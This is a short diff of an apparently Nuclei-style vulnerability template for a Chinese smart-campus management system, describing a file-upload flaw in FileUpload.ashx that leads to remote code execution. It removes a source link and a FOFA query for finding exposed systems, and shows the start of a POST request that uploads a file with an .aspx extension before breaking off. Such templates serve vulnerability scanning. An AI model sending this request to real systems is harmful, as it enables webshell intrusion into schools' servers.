@@ -3,12 +3,8 @@ info:
   name: 智慧校园(安校易)管理系统 FileUpload.ashx 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wd1ktfgnwq56zzwx'
+  description: ''
   tags: rce,file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wd1ktfgnwq56zzwx
-    fofa: title="智慧综合管理平台登入"
 http:
 - raw:
   - 'POST /Tool/FileUpload.ashx?action=PhotoByte&ext=1.aspx HTTP/1.1
